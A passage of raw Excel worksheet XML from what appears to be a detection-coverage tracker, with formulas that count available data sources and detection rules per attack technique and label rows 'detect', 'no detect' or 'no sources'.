      <c r="I292" s="9" t="str" cm="1">
        <f t="array" ref="I292">IF(SUM(IF($C292=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C292=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J292" s="9" cm="1">
        <f t="array" ref="J29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292" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>2</v>
      </c>
      <c r="M292" s="9" cm="1">
        <f t="array" ref="M292">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>2</v>
      </c>
      <c r="N292" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O292" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P292" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S29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92" t="s">
        <v>1084</v>
      </c>
      <c r="U292" t="s">
        <v>1521</v>
      </c>
      <c r="V292" t="s">
        <v>1522</v>
      </c>
      <c r="W292" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="293" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A293" t="s">
        <v>1519</v>
      </c>
      <c r="B293" t="s">
        <v>1523</v>
      </c>
      <c r="C293" t="s">
        <v>1524</v>
      </c>
      <c r="D293" t="s">
        <v>747</v>
      </c>
      <c r="E293" t="s">
        <v>1525</v>
      </c>
      <c r="F293" s="9">
        <f t="shared" si="4"/>
        <v>4</v>
      </c>
      <c r="G293" s="9" cm="1">
        <f t="array" ref="G293">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>4</v>
      </c>
      <c r="H293" s="9" t="str" cm="1">
        <f t="array" ref="H293">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I293" s="9" t="str" cm="1">
        <f t="array" ref="I293">IF(SUM(IF($C293=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C293=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J293" s="9" t="str" cm="1">
        <f t="array" ref="J29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93" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M293" s="9" cm="1">
        <f t="array" ref="M293">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N293" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O293" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P293" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S29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93" t="s">
        <v>386</v>
      </c>
      <c r="U293" t="s">
        <v>1526</v>
      </c>
      <c r="V293" t="s">
        <v>1527</v>
      </c>
      <c r="W293" t="b">
        <v>1</v>
      </c>
      <c r="X293" t="s">
        <v>1519</v>
      </c>
    </row>
    <row r="294" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A294" t="s">
        <v>1519</v>
      </c>
      <c r="B294" t="s">
        <v>1528</v>
      </c>
      <c r="C294" t="s">
        <v>1529</v>
      </c>
      <c r="D294" t="s">
        <v>747</v>
      </c>
      <c r="E294" t="s">
        <v>1530</v>
      </c>
      <c r="F294" s="9">
        <f t="shared" si="4"/>
        <v>4</v>
      </c>
      <c r="G294" s="9" cm="1">
        <f t="array" ref="G294">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H294" s="9" t="str" cm="1">
        <f t="array" ref="H294">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I294" s="9" t="str" cm="1">
        <f t="array" ref="I294">IF(SUM(IF($C294=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C294=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J294" s="9" t="str" cm="1">
        <f t="array" ref="J29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94" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M294" s="9" cm="1">
        <f t="array" ref="M294">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N294" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O294" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P294" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S29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94" t="s">
        <v>1084</v>
      </c>
      <c r="U294" t="s">
        <v>1531</v>
      </c>
      <c r="V294" t="s">
        <v>1532</v>
      </c>
      <c r="W294" t="b">
        <v>1</v>
      </c>
      <c r="X294" t="s">
        <v>1519</v>
      </c>
    </row>
    <row r="295" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A295" t="s">
        <v>1533</v>
      </c>
      <c r="B295" t="s">
        <v>1533</v>
      </c>
      <c r="C295" t="s">
        <v>38</v>
      </c>
      <c r="D295" t="s">
        <v>13</v>
      </c>
      <c r="E295" t="s">
        <v>1534</v>
      </c>
      <c r="F295" s="9">
        <f t="shared" si="4"/>
        <v>10</v>
      </c>
      <c r="G295" s="9" cm="1">
        <f t="array" ref="G295">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H295" s="9" cm="1">
        <f t="array" ref="H295">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>1</v>
      </c>
      <c r="I295" s="9" t="str" cm="1">
        <f t="array" ref="I295">IF(SUM(IF($C295=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C295=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J295" s="9" cm="1">
        <f t="array" ref="J29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295" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M295" s="9" cm="1">
        <f t="array" ref="M295">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N295" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O295" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P295" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S29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95" t="s">
        <v>1334</v>
      </c>
      <c r="U295" t="s">
        <v>1535</v>
      </c>
      <c r="V295" t="s">
        <v>1536</v>
      </c>
      <c r="W295" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="296" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A296" t="s">
        <v>1533</v>
      </c>
      <c r="B296" t="s">
        <v>1537</v>
      </c>
      <c r="C296" t="s">
        <v>1538</v>
      </c>
      <c r="D296" t="s">
        <v>13</v>
      </c>
      <c r="E296" t="s">
        <v>1539</v>
      </c>
      <c r="F296" s="9">
        <f t="shared" si="4"/>
        <v>1</v>
      </c>
      <c r="G296" s="9" cm="1">
        <f t="array" ref="G296">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H296" s="9" t="str" cm="1">
        <f t="array" ref="H296">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I296" s="9" t="str" cm="1">
        <f t="array" ref="I296">IF(SUM(IF($C296=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C296=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J296" s="9" t="str" cm="1">
        <f t="array" ref="J29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96" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M296" s="9" cm="1">
        <f t="array" ref="M296">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N296" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O296" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P296" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S29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96" t="s">
        <v>520</v>
      </c>
      <c r="U296" t="s">
        <v>1540</v>
      </c>
      <c r="W296" t="b">
        <v>1</v>
      </c>
      <c r="X296" t="s">
        <v>1533</v>
      </c>
    </row>
    <row r="297" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A297" t="s">
        <v>1541</v>
      </c>
      <c r="B297" t="s">
        <v>1541</v>
      </c>
      <c r="C297" t="s">
        <v>49</v>
      </c>
      <c r="D297" t="s">
        <v>13</v>
      </c>
      <c r="E297" t="s">
        <v>1542</v>
      </c>
      <c r="F297" s="9">
        <f t="shared" si="4"/>
        <v>6</v>
      </c>
      <c r="G297" s="9" cm="1">
        <f t="array" ref="G297">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H297" s="9" cm="1">
        <f t="array" ref="H297">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I297" s="9" t="str" cm="1">
        <f t="array" ref="I297">IF(SUM(IF($C297=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C297=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J297" s="9" t="str" cm="1">
        <f t="array" ref="J29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97" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M297" s="9" cm="1">
        <f t="array" ref="M297">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N297" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O297" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P297" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S29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97" t="s">
        <v>485</v>
      </c>
      <c r="U297" t="s">
        <v>1543</v>
      </c>
      <c r="V297" t="s">
        <v>1544</v>
      </c>
      <c r="W297" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="298" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A298" t="s">
        <v>1545</v>
      </c>
      <c r="B298" t="s">
        <v>1545</v>
      </c>
      <c r="C298" t="s">
        <v>157</v>
      </c>
      <c r="D298" t="s">
        <v>13</v>
      </c>
      <c r="E298" t="s">
        <v>1546</v>
      </c>
      <c r="F298" s="9">
        <f t="shared" si="4"/>
        <v>7</v>
      </c>
      <c r="G298" s="9" cm="1">
        <f t="array" ref="G298">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H298" s="9" cm="1">
        <f t="array" ref="H298">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I298" s="9" t="str" cm="1">
        <f t="array" ref="I298">IF(SUM(IF($C298=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C298=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J298" s="9" t="str" cm="1">
        <f t="array" ref="J29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98" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M298" s="9" cm="1">
        <f t="array" ref="M298">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N298" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O298" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P298" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S29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98" t="s">
        <v>368</v>
      </c>
      <c r="U298" t="s">
        <v>1547</v>
      </c>
      <c r="V298" t="s">
        <v>1548</v>
      </c>
      <c r="W298" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="299" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A299" t="s">
        <v>1549</v>
      </c>
      <c r="B299" t="s">
        <v>1549</v>
      </c>
      <c r="C299" t="s">
        <v>134</v>
      </c>
      <c r="D299" t="s">
        <v>13</v>
      </c>
      <c r="E299" t="s">
        <v>1550</v>
      </c>
      <c r="F299" s="9">
        <f t="shared" si="4"/>
        <v>7</v>
      </c>
      <c r="G299" s="9" cm="1">
        <f t="array" ref="G299">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H299" s="9" cm="1">
        <f t="array" ref="H299">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I299" s="9" t="str" cm="1">
        <f t="array" ref="I299">IF(SUM(IF($C299=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C299=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J299" s="9" t="str" cm="1">
        <f t="array" ref="J29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299" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M299" s="9" cm="1">
        <f t="array" ref="M299">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N299" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O299" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P299" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S29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299" t="s">
        <v>686</v>
      </c>
      <c r="U299" t="s">
        <v>1551</v>
      </c>
      <c r="V299" t="s">
        <v>1552</v>
      </c>
      <c r="W299" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="300" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A300" t="s">
        <v>1553</v>
      </c>
      <c r="B300" t="s">
        <v>1553</v>
      </c>
      <c r="C300" t="s">
        <v>75</v>
      </c>
      <c r="D300" t="s">
        <v>13</v>
      </c>
      <c r="E300" t="s">
        <v>1554</v>
      </c>
      <c r="F300" s="9">
        <f t="shared" si="4"/>
        <v>4</v>
      </c>
      <c r="G300" s="9" cm="1">
        <f t="array" ref="G300">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H300" s="9" cm="1">
        <f t="array" ref="H300">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>2</v>
      </c>
      <c r="I300" s="9" t="str" cm="1">
        <f t="array" ref="I300">IF(SUM(IF($C300=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C300=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J300" s="9" cm="1">
        <f t="array" ref="J30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300" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>2</v>
      </c>
      <c r="M300" s="9" cm="1">
        <f t="array" ref="M300">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>2</v>
      </c>
      <c r="N300" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O300" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P300" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S30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00" t="s">
        <v>485</v>
      </c>
      <c r="U300" t="s">
        <v>1555</v>
      </c>
      <c r="V300" t="s">
        <v>1556</v>
      </c>
      <c r="W300" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="301" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A301" t="s">
        <v>1553</v>
      </c>
      <c r="B301" t="s">
        <v>1557</v>
      </c>
      <c r="C301" t="s">
        <v>1558</v>
      </c>
      <c r="D301" t="s">
        <v>13</v>
      </c>
      <c r="E301" t="s">
        <v>1554</v>
      </c>
      <c r="F301" s="9">
        <f t="shared" si="4"/>
        <v>4</v>
      </c>
      <c r="G301" s="9" cm="1">
        <f t="array" ref="G301">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H301" s="9" t="str" cm="1">
        <f t="array" ref="H301">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I301" s="9" t="str" cm="1">
        <f t="array" ref="I301">IF(SUM(IF($C301=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C301=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J301" s="9" t="str" cm="1">
        <f t="array" ref="J30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01" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M301" s="9" cm="1">
        <f t="array" ref="M301">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N301" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O301" s="14">
